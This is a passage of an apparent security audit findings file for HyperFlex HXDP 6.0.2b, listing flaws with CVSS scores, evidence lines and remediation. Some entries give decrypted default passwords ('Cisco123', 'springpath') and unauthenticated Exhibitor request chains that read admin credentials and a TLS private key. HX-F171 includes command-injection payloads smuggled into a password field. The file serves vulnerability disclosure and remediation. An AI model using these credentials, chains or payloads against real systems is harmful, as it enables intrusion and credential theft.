        "springpath_env_parse.py:30-35: ENV_VARIABLE_STCTL_PASS = base_path + '/dependencies/Secret.class'",
        "springpath_env_parse.py:51: hash_md5.update(chunk)  # md5(Secret.class) is the AES key",
        "springpath_env_parse.py:61: cipher = AES.new(key, AES.MODE_CBC, iv)",
        "springpath_env_parse.py:84-85: if tokens[1] in ['stctl_vm_passwd','ssl_cert_passwd','installer_passwd']: decrypt(md5(Secret.class), value)",
        "springpath_default.tunes: stctl_vm_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=",
        "springpath_default.tunes: ssl_cert_passwd=yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s=",
        "springpath_default.tunes: installer_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=",
        "VERIFIED: md5(Secret.class)=1f6d13bcd7753f2d3b2e2da361b7afb5; decrypt(stctl_vm_passwd)='Cisco123'",
        "VERIFIED: decrypt(ssl_cert_passwd)='springpath' (matches HX-F154 hardcoded keystore password)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace file-derived key with a per-deployment secret generated at provisioning time and "
        "stored in a hardware-backed keystore (TPM or HSM). Rotate default credentials on first boot "
        "using a provisioning-time random generator. Remove hardcoded defaults from all .tunes files "
        "and enforce password change on first login."
    ),
    "tags": ["hardcoded-key", "aes", "default-password", "stctl", "cwe-321", "cwe-798", "critical"],
}

HX_F160 = {
    "id": "HX-F160",
    "title": "ESX Password Exposed in Ansible Extra-Vars Cmdline (factory_deploy.py CWE-214)",
    "severity": "MEDIUM",
    "cvss": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-214",
    "component": "storfs-factory/ansible/factory_deploy.py",
    "description": (
        "factory_deploy.py invokes the Ansible factory playbook via os.execlpe(), passing the ESX "
        "password as a plaintext --extra-vars argument (line 87: 'esxPassword=%s' % password). "
        "The Ansible process cmdline is visible in /proc/<pid>/cmdline and ps aux to any process "
        "on the same host. The -vvvv verbose flag is hardcoded (line 91), causing Ansible to echo "
        "all extra-vars — including the password — to its log output and stdout. Combined, these "
        "expose the ESXi root password to local process enumeration and log scraping."
    ),
    "evidence": [
        "factory_deploy.py:81-91: os.execlpe('./factory_deploy.yml', 'factory_deploy.yml',",
        "  '--extra-vars', 'esxPassword=%s' % (password),",
        "  '-vvvv', os.environ)  # verbose flag always set",
        "factory_deploy.py:33: -p/--password positional argument accepted; passed to factory_deploy_node()",
        "factory_deploy.py:97-103: README usage: ./factory_deploy.py -e <ip> -u <user> -p <password>",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Pass credentials via Ansible vault or a temporary file with restricted permissions rather "
        "than command-line --extra-vars. Remove -vvvv from production invocations or sanitize "
        "extra-vars from verbose output. Use ANSIBLE_VAULT_PASSWORD_FILE or a callback plugin "
        "that redacts sensitive variables from logs."
    ),
    "tags": ["cmdline-exposure", "ansible", "esx", "password", "cwe-214", "factory"],
}

HX_F161 = {
    "id": "HX-F161",
    "title": "Diagnostic Account Not Barred from Upgrade/Encryption/Support WAR APIs (Incomplete barredUsers)",
    "severity": "HIGH",
    "cvss": 7.2,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-269",
    "component": "upgrade-war, enc-war, encryption-war, support-war: application.conf",
    "description": (
        "The auth-war and authfilter JAR correctly define barredUsers as "
        "[\"root\", \"local/root\", \"diag\", \"local/diag\"], preventing the diagnostic account "
        "from authenticating to management APIs. However, four other WARs (upgrade, enc, "
        "encryption, support) define barredUsers as only [\"root\", \"local/root\"], omitting "
        "the diag entries. The diag account is a real cluster-level account: it appears in "
        "passwordSyncAccounts = [\"root\", \"admin\", \"diag\"] across hxSvcMgr, stMgr, and "
        "hxSupportSvc application.conf files, meaning the same password is maintained on all "
        "cluster nodes. Because diag is not barred from the upgrade, encryption, and support "
        "APIs, an attacker who obtains the diag credential can authenticate to endpoints that "
        "should be restricted to admin-class users: encryption key operations, firmware upgrades, "
        "and support bundle access."
    ),
    "evidence": [
        "authfilter/application.conf: barredUsers = [\"root\", \"local/root\", \"diag\", \"local/diag\"]",
        "auth-war/WEB-INF/classes/application.conf: barredUsers = [\"root\", \"local/root\", \"diag\", \"local/diag\"]",
        "upgrade-war/WEB-INF/classes/application.conf: barredUsers = [\"root\", \"local/root\"]  # diag absent",
        "enc-war/WEB-INF/classes/application.conf: barredUsers = [\"root\", \"local/root\"]  # diag absent",
        "encryption-war/WEB-INF/classes/application.conf: barredUsers = [\"root\", \"local/root\"]  # diag absent",
        "support-war/WEB-INF/classes/application.conf: barredUsers = [\"root\", \"local/root\"]  # diag absent",
        "hxSvcMgr application.conf: passwordSyncAccounts = [\"root\", \"admin\", \"diag\"]  # diag is a live synced account",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Add \"diag\" and \"local/diag\" to barredUsers in all WAR application.conf files. "
        "Audit all per-WAR application.conf overrides against the reference authfilter config "
        "to ensure consistent security policy enforcement. Treat the authfilter config as the "
        "authoritative source for barredUsers."
    ),
    "tags": ["diag-account", "access-control", "barred-users", "upgrade-api", "encryption-api", "cwe-269"],
}

HX_F162 = {
    "id": "HX-F162",
    "title": "Incomplete Servlet Filter Chain in Upgrade/Support/Encryption WARs (Missing KerberosAuth and ServiceAccessAuth)",
    "severity": "MEDIUM",
    "cvss": 6.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N",
    "cwe": "CWE-284",
    "component": "upgrade-war, support-war, encryption-war: WEB-INF/web.xml",
    "description": (
        "The reference WARs (coreapi, auth) deploy a 7-filter servlet chain: AuditFilter, "
        "SPPrivilegedAuth, SessionAuth, KerberosAuth, ServiceAccessAuth, SPBasicAuth, SPAuth. "
        "Three production WARs deviate: upgrade-war and support-war are missing both KerberosAuth "
        "(KerberosFilterImpl) and ServiceAccessAuth (ServiceAccessAuthFilterImpl), leaving a "
        "5-filter chain. encryption-war is missing only ServiceAccessAuth, leaving a 6-filter chain. "
        "ServiceAccessAuth enforces service-to-service authorization checks on top of authentication. "
        "Its absence from the encryption WAR means authenticated principals (including those "
        "authenticated via the incomplete barredUsers list per HX-F161) can invoke encryption key "
        "management endpoints without the service-level authorization gate. Missing KerberosAuth "
        "in upgrade-war and support-war means Windows/AD users cannot use Kerberos tokens for "
        "upgrade and support operations, and any Kerberos-specific access controls are absent."
    ),
    "evidence": [
        "coreapi/restapi-war web.xml: 7 filters — AuditFilter, SPPrivilegedAuth, SessionAuth, KerberosAuth, ServiceAccessAuth, SPBasicAuth, SPAuth",
        "auth-war web.xml: 7 filters (same as coreapi)",
        "encryption-war web.xml: 6 filters — MISSING ServiceAccessAuth",
        "upgrade-war web.xml: 5 filters — MISSING KerberosAuth AND ServiceAccessAuth",
        "support-war web.xml: 5 filters — MISSING KerberosAuth AND ServiceAccessAuth",
        "Encryption WAR manages key operations; absent ServiceAccessAuth = no service-account gate on key management",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Add KerberosFilterImpl and ServiceAccessAuthFilterImpl to all WARs that handle sensitive "
        "operations (upgrade, encryption, support). Use the coreapi/auth-war filter chain as the "
        "reference template. Enforce consistent filter chain policy via a shared parent web.xml "
        "or shared filter configuration."
    ),
    "tags": ["servlet-filter", "kerberos", "service-access-auth", "encryption-api", "upgrade-api", "cwe-284"],
}

HX_F163 = {
    "id": "HX-F163",
    "title": "Hyper-V Host Admin Credentials in ZooKeeper /stSSOMgr/auth/creds Readable via Unauthenticated Exhibitor API",
    "severity": "CRITICAL",
    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-306",
    "component": "stSSOMgr, Exhibitor ZooKeeper REST API (chain: HX-F155)",
    "description": (
        "The stSSOMgr service stores Hyper-V host admin credentials as a JSON blob in ZooKeeper at "
        "path /stSSOMgr/auth/creds (zkBasePath='/stSSOMgr', zkAuthKey='/auth', zkCredsKey='creds' "
        "per stSSOMgr-1.0/conf/application.conf). The blob contains 'host.localadminusername' and "
        "'host.localadminusercred' (base64-encoded admin password). The Exhibitor ZooKeeper REST API "
        "(HX-F155) exposes unauthenticated read access to any ZK node via "
        "GET /exhibitor/v1/explorer/node?key=<path>, which returns bytes64: base64(nodeData). "
        "Chain: reach port 8180 (DNAT-forwarded from eth0 per HX-F155) -> "
        "GET /exhibitor/v1/explorer/node?key=/stSSOMgr/auth/creds -> "
        "decode bytes64 -> JSON with admin username + b64(password) -> "
        "decode b64 -> plaintext Hyper-V host admin password. "
        "stssoclient.py fetch_creds() confirms the JSON schema: "
        "auth_json['host']['localadminusername'] and auth_json['host']['localadminusercred']. "
        "Similarly, /stSSOMgr/auth/keyData stores SSO encryption key material also readable "
        "via the same unauthenticated path."
    ),
    "evidence": [
        "stSSOMgr-1.0/conf/application.conf:12-15: zkBasePath='/stSSOMgr', zkAuthKey='/auth', zkCredsKey='creds', zkEncryptionKey='keyData'",
        "stssoclient.py:77-86: hyperv_creds = stssoclient.getHypervHostCreds(); auth_json['host']['localadminusercred']",
        "create_node_info.py:111: host_info['username'], host_info['password'] = ssoClient.fetch_creds()",
        "create_hv_sb.py:42-47: sso_creds = st_sso_client.getHypervHostCreds() # Hyper-V creds from ZK",
        "Chain: GET http://<ip>:8180/exhibitor/v1/explorer/node?key=/stSSOMgr/auth/creds",
        "-> decode bytes64 -> JSON {host: {localadminusername, localadminusercred}} -> decode b64 -> plaintext password",
        "Exhibitor unauthenticated: confirmed by HX-F155 (no auth headers in node_replace.py, exhibitorCfg.py)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Protect the Exhibitor API with authentication and authorization (add a shared secret or "
        "bind to localhost only; remove the DNAT iptables rule). Encrypt ZK node data at rest for "
        "sensitive paths. Rotate Hyper-V admin credentials after patch deployment."
    ),
    "tags": ["zookeeper", "exhibitor", "hyperv-creds", "chain-hx-f155", "unauth-read", "cwe-306", "critical"],
}

HX_F164 = {
    "id": "HX-F164",
    "title": "SSH RSA Private Keys Stored World-Accessible in /tmp/sshKeyPair*.json",
    "severity": "HIGH",
    "cvss": 7.8,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-312",
    "component": "storfs-deploy/ansible/commonFunctions.py",
    "description": (
        "commonFunctions.py stores RSA SSH private keys as JSON in /tmp/sshKeyPair*.json (line 645: "
        "credsFile = getMatchingFileName('/tmp/sshKeyPair*.json')). The /tmp directory on Linux "
        "uses sticky-bit permissions — files may not be deleted by other users but ARE readable by "
        "default unless the writing process explicitly restricts permissions. These keys are used "
        "by run_command_on_node() (line 654) to authenticate as root to all HyperFlex cluster nodes "
        "(paramiko.SSHClient.connect(hostname=node, username='root', pkey=key)). Any local process "
        "or user that can read the sshKeyPair file gains root SSH access to all cluster nodes. "
        "run_command_on_node() also uses AutoAddPolicy() (MITM risk, same pattern as HX-F157)."
    ),
    "evidence": [
        "commonFunctions.py:645: credsFile = getMatchingFileName('/tmp/sshKeyPair*.json')",
        "commonFunctions.py:646-649: with open(credsFile) as f: data = json.load(f)",
        "commonFunctions.py:654: creds[<node>] = private_key",
        "commonFunctions.py:659-661: key = paramiko.RSAKey.from_private_key(io.StringIO(private_key))",
        "commonFunctions.py:662: client.connect(hostname=node, username='root', pkey=key)  # root on all nodes",
        "commonFunctions.py:656: client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "9997_post_upgrade_cleanup_ESX.py:27: creds = load_hxvm_credentials()  # invokes the /tmp path",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Write sshKeyPair JSON to a permissions-restricted file (chmod 600) or use a dedicated "
        "credential store rather than /tmp. Delete the key file immediately after use. Replace "
        "AutoAddPolicy() with strict host verification."
    ),
    "tags": ["ssh-keys", "tmp", "world-readable", "root-access", "paramiko", "cwe-312"],
}

HX_F165 = {
    "id": "HX-F165",
    "title": "TLS Private Key and Certificate Stored in ZooKeeper Readable via Unauthenticated Exhibitor API",
    "severity": "CRITICAL",
    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-312",
    "component": "hxSvcMgr (storfs-mgmt), Exhibitor ZooKeeper REST API (chain: HX-F155)",
    "description": (
        "hxSvcMgr stores the TLS private key and certificate for the HyperFlex management service "
        "in ZooKeeper: sslKeyZKPath = '/storvisor/ssl/key' and sslCertZKPath = '/storvisor/ssl/certificate' "
        "(hxSvcMgr-1.0/conf/application.conf lines 130-131). "
        "The Exhibitor ZooKeeper REST API (HX-F155) provides unauthenticated read access to any ZK node. "
        "Chain: reach port 8180 (DNAT-forwarded per HX-F155) -> "
        "GET /exhibitor/v1/explorer/node?key=/storvisor/ssl/key -> "
        "decode bytes64 field -> extract TLS private key PEM. "
        "An attacker with the private key can: (1) decrypt all captured TLS management traffic, "
        "(2) perform MITM against the management API (all TLS bypasses in HX-F142/F148/F151/F156 "
        "become unnecessary — the private key enables full passive decryption), "
        "(3) forge JWT tokens if the key overlaps with the JWT signing key (as suggested by "
        "the single hyperflex_keystore.jceks in HX-F154). "
        "The certificate path /storvisor/ssl/certificate similarly exposes the public cert chain, "
        "confirming the identity material used for MITM."
    ),
    "evidence": [
        "hxSvcMgr-1.0/conf/application.conf:130: sslCertZKPath = '/storvisor/ssl/certificate'",
        "hxSvcMgr-1.0/conf/application.conf:131: sslKeyZKPath = '/storvisor/ssl/key'",
        "Chain: GET http://<ip>:8180/exhibitor/v1/explorer/node?key=/storvisor/ssl/key",
        "-> response: {bytes64: '<b64 TLS private key>', ...}",
        "-> decode bytes64 -> PEM private key",
        "Exhibitor unauthenticated: confirmed HX-F155; DNAT rule exposes 8180 on eth0",
        "Related: HX-F154 (springpath keystore password); HX-F163 (Hyper-V creds via same path)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Do not store TLS private key material in ZooKeeper. Use a dedicated secrets manager "
        "(HashiCorp Vault, HSM) or encrypt ZK data at rest with a deployment-unique key. "
        "Restrict Exhibitor API to localhost-only. Remove the DNAT rule forwarding port 8180 "
        "to the management interface (HX-F155 remediation)."
    ),
    "tags": ["tls-key", "zookeeper", "exhibitor", "chain-hx-f155", "private-key", "cwe-312", "critical"],
}

HX_F166 = {
    "id": "HX-F166",
    "title": "Hardcoded Default ESXi Password 'springpath' in Networking Configuration Script",
    "severity": "CRITICAL",
    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-798",
    "component": "storfs-deploy/ansible/configureNetworking_VCenter.py",
    "description": (
        "configureNetworking_VCenter.py sets the class-level ESXi password default as a hardcoded "
        "literal: ESX_PWD = 'springpath' (line 319). This is the ESXi root password used for all "
        "ESXi host operations: vSphere connections (line 731, 809), hardware identification "
        "(line 1331), and iSCSI configuration (line 731). Any HyperFlex deployment that has not "
        "explicitly provided an ESXi password (via --esx-password flag or JSON config) will use "
        "'springpath' to authenticate to the ESXi hypervisor layer. Combined with HX-F159 "
        "(stctl VM default password 'Cisco123'), this gives unauthenticated attackers two separate "
        "hardcoded defaults: 'springpath' for the ESXi hypervisor and 'Cisco123' for the storage "
        "controller VM root account. ESX_PWD = 'springpath' is loaded at class definition time "
        "before any user input; it is the active credential if the caller omits the password argument. "
        "CTL_PWD on line 315 also calls parseEnvVariableTunes('credentials.stctl_vm_passwd'), "
        "confirming the tunes-based 'Cisco123' credential is the stctl default (consistent with HX-F159)."
    ),
    "evidence": [
        "configureNetworking_VCenter.py:319: ESX_PWD = 'springpath'  # class-level default",
        "configureNetworking_VCenter.py:315: CTL_PWD = parseEnvVariableTunes('credentials.stctl_vm_passwd')  # decrypts to 'Cisco123' per HX-F159",
        "configureNetworking_VCenter.py:731: uses SpringpathNetworkingSetup_VCenter.ESX_PWD in vSphere connect",
        "configureNetworking_VCenter.py:1331: isHXHardware(esx_host, ESX_USER, ESX_PWD)  # ESXi auth with hardcoded default",
        "help text line 387: '--esx-password - ESXi password (defaults to \"springpath\")'",
        "help text line 389: '--ctl-password - controller password (defaults to \"springpath\")'",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the hardcoded ESX_PWD default. Require --esx-password as a mandatory argument with "
        "no default. Enforce a password-change policy on first deployment that prevents the default "
        "value from persisting. Audit all scripts that reference ESX_PWD to ensure the default "
        "never reaches a production ESXi host connection."
    ),
    "tags": ["hardcoded-password", "esxi", "springpath", "default-credentials", "cwe-798", "critical"],
}

HX_F167 = {
    "id": "HX-F167",
    "title": "TLS Verification Disabled in Ansible Playbook curl Calls for Security-Critical ctlVM Operations",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-deploy/ansible/roles/postinstall_controllervm/tasks/configure.yml, storagenode.yml",
    "description": (
        "Multiple Ansible playbook tasks invoke curl with the -k flag (disable TLS verification) "
        "when communicating with the storage controller VM securityservice endpoints. The affected "
        "operations include: removing authentication keys (POST /securityservice/v1/removeauthkey), "
        "setting a security baseline (POST /securityservice/v1/sfi/baseline), enabling SSH access "
        "(PUT /securityservice/v1/secureshell), and cluster registration. These are called with "
        "admin credentials (-u admin:{{ ctlvmPassword | b64decode }}) over unverified TLS. "
        "An attacker performing MITM can intercept auth key removal, inject their own auth key, "
        "modify the security baseline before it is applied, or extract admin credentials. "
        "The -k pattern extends the systemic TLS bypass (HX-F156) from Python scripts to "
        "Ansible playbook curl calls, covering the deployment and provisioning pipeline."
    ),
    "evidence": [
        "configure.yml:31: curl -k ... DELETE /securityservice/v1/removeauthkey -u admin:{{ ctlvmPassword | b64decode }}",
        "configure.yml:57: curl -k ... POST /securityservice/v1/sfi/baseline -u admin:{{ ctlvmPassword | b64decode }}",
        "configure.yml:69: curl -k ... PUT /securityservice/v1/secureshell?status=true -u admin:{{ ctlvmPassword }}",
        "storage_client.yml:49: curl -k ... POST /securityservice/v1/configurescn -u admin:{{ ctlvmPassword }}",
        "storagenode.yml:44: curl -k ... GET /securityservice/v1/secureshell -u admin:{{ ctlvmPassword | b64decode }}",
        "storagenode.yml:77: curl -k ... GET /coreapi/v1/clusters -u admin:{{ ctlvmPassword | b64decode }}",
        "configure.yml:43: curl -k ... DELETE /securityservice/v1/removeauthkey for ansible user",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the -k flag from all curl invocations in Ansible playbooks. Pin the ctlVM TLS "
        "certificate or add the CA cert to curl's certificate store (--cacert). If a self-signed "
        "cert is used, pre-distribute the cert fingerprint and use --pinnedpubkey instead."
    ),
    "tags": ["tls-bypass", "ansible", "curl", "securityservice", "cwe-295", "deploy"],
}

HX_F168 = {
    "id": "HX-F168",
    "title": "Deployment API Hard-Coded Credential Default and TLS Bypass in deployNodes.py",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-798",
    "component": "storfs-deploy/ansible/deployNodes.py",
    "description": (
        "deployNodes.py retrieves the installer password at module load time via "
        "parseEnvVariableTunes('credentials.installer_passwd'), which decrypts to 'Cisco123' "
        "(same AES key and tunes file as HX-F159). This decrypted password is then set as the "
        "default value for the --password command-line option (line 44). When invoked without "
        "an explicit --password argument, all REST API calls to the deployment appliance "
        "(https://<appliance>/rest/deployment/) authenticate with root:Cisco123. Additionally, "
        "every requests call in the file uses verify=False explicitly, and the script calls "
        "requests.packages.urllib3.disable_warnings() at startup to suppress the resulting "
        "InsecureRequestWarning. An attacker with network access to the deployment appliance "
        "can authenticate with the default credentials during or after deployment. The "
        "verify=False pattern means MITM can intercept the deployment API session and manipulate "
        "cluster configuration payloads. The disable_warnings() call ensures no logs or terminal "
        "output reflects the insecure TLS state."
    ),
    "evidence": [
        "deployNodes.py:14: sys.path.append('/usr/share/hyperflex/storfs-misc/')",
        "deployNodes.py:17: from springpath_env_parse import parseEnvVariableTunes",
        "deployNodes.py:28: INSTALLER_PASSWD = parseEnvVariableTunes('credentials.installer_passwd')",
        "deployNodes.py:43-44: p.add_option('--password', dest='password', default=INSTALLER_PASSWD, ...)",
        "deployNodes.py:88: requests.packages.urllib3.disable_warnings()",
        "deployNodes.py:147: authData=(opts.user, opts.password)  # user defaults to 'root'",
        "deployNodes.py:148: r = requests.get(deploymentsUrl, auth=authData, verify=False)",
        "deployNodes.py:154: r = requests.get(progressUrl, auth=authData, verify=False)",
        "deployNodes.py:157: r = requests.post(checkDeployNodesUrl, ..., auth=authData, verify=False, ...)",
        "deployNodes.py:160: r = requests.post(deployNodesUrl, ..., auth=authData, verify=False, ...)",
        "springpath_default.tunes: installer_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU= -> 'Cisco123'",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Require --password to be explicitly provided; do not default to the tunes credential. "
        "Remove verify=False from all requests calls and trust the system CA store or pin the "
        "deployment appliance certificate. Remove disable_warnings() — warnings exist for a reason. "
        "Rotate the installer_passwd from the firmware-wide default."
    ),
    "tags": ["hardcoded-creds", "tls-bypass", "deploy", "installer", "cwe-798", "cwe-295", "requests"],
}

HX_F169 = {
    "id": "HX-F169",
    "title": "ESX Password Exposed in Remote Process Arguments During Authorized Keys Upgrade Hook",
    "severity": "HIGH",
    "cvss": 6.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-214",
    "component": "storfs-deploy/ansible/roles/upgradeclusterposthooks/files/0007_create_authorized_keys_for_admin_ESX.py",
    "description": (
        "The upgrade post-hook 0007_create_authorized_keys_for_admin_ESX.py formats the ESX "
        "password as a positional argument when invoking copyAuthKeysForAdmin.py on each node: "
        "`command = '{script} {esxi_ip} {esxi_username} {esxi_password}'.format(...)`. "
        "The resulting command string is then executed on the remote node via paramiko SSH "
        "(run_command_on_node), making the ESX password visible in the process argument list "
        "(ps aux / /proc/<pid>/cmdline) on the target node for the duration of the command. "
        "The plaintext password is also sent in the SSH exec_command payload over a connection "
        "that uses paramiko.AutoAddPolicy(), exposing it to MITM. The ESX credentials originate "
        "from /tmp/upgradeHooksCreds*.json, which stores them in plaintext in /tmp."
    ),
    "evidence": [
        "0007_create_authorized_keys_for_admin_ESX.py:74: esxi_username = creds.get('esxUser').strip()",
        "0007_create_authorized_keys_for_admin_ESX.py:75: esxi_password = creds.get('esxPassword').strip()",
        "0007_create_authorized_keys_for_admin_ESX.py:82: command = '{0} {1} {2} {3}'.format(authKeyCopyingScript, esxi_ip, esxi_username, esxi_password)",
        "0007_create_authorized_keys_for_admin_ESX.py:84: run_command_on_node(node, private_key, command)",
        "JSON_CREDS_FILE_MATCH = '/tmp/upgradeHooksCreds*.json' -- plaintext creds file in /tmp",
        "commonFunctions.py: run_command_on_node uses paramiko.AutoAddPolicy() (HX-F164)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Pass credentials via environment variable or stdin, not command-line arguments. "
        "Move the credential file out of /tmp and apply 0600 permissions. "
        "Fix the underlying AutoAddPolicy issue (see HX-F164)."
    ),
    "tags": ["cleartext-creds", "process-args", "esx", "upgrade-hook", "cwe-214", "cwe-295"],
}

HX_F170 = {
    "id": "HX-F170",
    "title": "Host Key Trust Bypass and Hard-Coded Default Credential in RDM Management SSH Connections",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-deploy/ansible/configureRDMs.py",
    "description": (
        "configureRDMs.py contains two functions — offlineRDMsinGuest() and hardBlackListDisks() "
        "— that connect to storage controller VMs via SSH using paramiko.AutoAddPolicy(), "
        "which accepts any host key without verification. Both functions fetch the ctlVM password "
        "via parseEnvVariableTunes('credentials.stctl_vm_passwd'), which decrypts to 'Cisco123' "
        "(the firmware-wide default, as confirmed in HX-F159). A network attacker who can "
        "intercept SSH traffic on the storage management network during an RDM configuration "
        "operation can impersonate the target ctlVM, receive the SSH connection (AutoAddPolicy "
        "accepts the attacker's host key), and capture root:Cisco123 credentials. The attacker "
        "can then replay those credentials against any node in the cluster."
    ),
    "evidence": [
        "configureRDMs.py:399: client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "configureRDMs.py:401: guest_passwd = parseEnvVariableTunes('credentials.stctl_vm_passwd')",
        "configureRDMs.py:402: client.connect(hostname, username=guest_uname, password=guest_passwd)",
        "configureRDMs.py:425: client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "configureRDMs.py:427: guest_passwd = parseEnvVariableTunes('credentials.stctl_vm_passwd')",
        "configureRDMs.py:428: client.connect(hostname, username=guest_uname, password=guest_passwd)",
        "springpath_default.tunes: stctl_vm_passwd -> 'Cisco123' (see HX-F159)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace AutoAddPolicy with known_hosts or certificate-pinned host key verification. "
        "Rotate stctl_vm_passwd from the firmware default before any production deployment."
    ),
    "tags": ["ssh-host-key", "hardcoded-creds", "rdm", "paramiko", "cwe-295", "cwe-798"],
}

HX_F171 = {
    "id": "HX-F171",
    "title": "OS Command Injection via Unsanitized Password in scpFile.py Shell Invocation",
    "severity": "HIGH",
    "cvss": 8.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-78",
    "component": "storfs-deploy/ansible/library/scpFile.py",
    "description": (
        "scpFile.py constructs an scp command by string-concatenating user-supplied parameters "
        "(remotevm_password, remotevm_hostname, remotevm_username, filename, dest) and executes "
        "the result with subprocess.Popen(cmd, shell=True). No sanitization or quoting is applied "
        "to any parameter. An attacker who can invoke this Ansible module with a crafted "
        "remotevm_password value (e.g. `x; id > /tmp/pwned #`) achieves arbitrary command "
        "execution with the privileges of the Ansible runner process. Additionally, "
        "`sshpass -p <password>` exposes the plaintext password in the process argument list "
        "for the duration of the transfer (CWE-214), and -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null disables all SSH host key verification (CWE-295)."
    ),
    "evidence": [
        "scpFile.py:112: cmd = 'sshpass -p '+remotevm_password+' scp -q -o StrictHostKeyChecking=no ...' + remotevm_username+'@'+remotevm_hostname+':'+filename+' '+dest",
        "scpFile.py:116: p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, ...)",
        "scpFile.py:69: remotevm_password=dict(required=True, type='str', no_log=True)  # no sanitization",
        "scpFile.py:112-114: all 5 user-supplied params string-concatenated into shell command",
        "Payload example: remotevm_password='x; touch /tmp/pwnd; #' -> executes touch /tmp/pwnd",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace shell=True with a list-form Popen invocation — pass each argument as a separate "
        "list element so the shell never interprets them. Use paramiko SCP or native Python SCP "
        "libraries instead of sshpass subprocess. Remove StrictHostKeyChecking=no."
    ),
    "tags": ["command-injection", "scp", "shell", "sshpass", "cwe-78", "cwe-214", "cwe-295"],
}

HX_F172 = {
    "id": "HX-F172",
    "title": "AES-ECB Mode Encryption with Cluster UUID as Predictable Key in convertUUIDAndEncryptData.py",
    "severity": "MEDIUM",
    "cvss": 5.9,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-327",
    "component": "storfs-deploy/ansible/library/convertUUIDAndEncryptData.py",
    "description": (
        "encryptData() in convertUUIDAndEncryptData.py uses AES in ECB mode. ECB is deterministic "
        "and mode-unsafe: identical 16-byte plaintext blocks produce identical ciphertext blocks, "
        "enabling plaintext structure recovery without the key. The encryption key is derived as "
        "SHA-256(cluster_uuid)[0:16]. The cluster UUID is a semi-public identifier present in "
        "HX API responses, UI pages, log files, and Exhibitor ZK paths. An attacker who can "
        "enumerate the cluster UUID (low bar — available unauthenticated via Exhibitor at "
        "/exhibitor/v1/cluster/status) can recompute the key and decrypt any data encrypted "
        "with this function. The combination of ECB mode (structural leakage) and a predictable "
        "key (UUID-derived) renders this encryption scheme cryptographically broken."
    ),
    "evidence": [
        "convertUUIDAndEncryptData.py:34: key = hashlib.sha256(bytes(encryption_key, 'utf-8')).digest()",
        "convertUUIDAndEncryptData.py:35: final_key = key[0:16]  # truncated SHA-256 of cluster UUID",
        "convertUUIDAndEncryptData.py:38: cipher = AES.new(final_key, AES.MODE_ECB)  # ECB — no IV",
        "Key source: cluster_uuid from Ansible params — same UUID available at /exhibitor/v1/cluster/status",
        "ECB structural leak: two identical 16-byte plaintext blocks -> same ciphertext block",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace AES-ECB with AES-GCM (authenticated) or AES-CBC with a random IV. "
        "Derive the key from a secret value (not the cluster UUID) using PBKDF2 or HKDF with "
        "adequate iterations and a random salt. Store the salt alongside the ciphertext."
    ),
    "tags": ["weak-crypto", "aes-ecb", "predictable-key", "cluster-uuid", "cwe-327", "cwe-321"],
}

HX_F173 = {
    "id": "HX-F173",
    "title": "World-Readable Root Session ID File Enables Admin API Authentication Bypass",
    "severity": "CRITICAL",
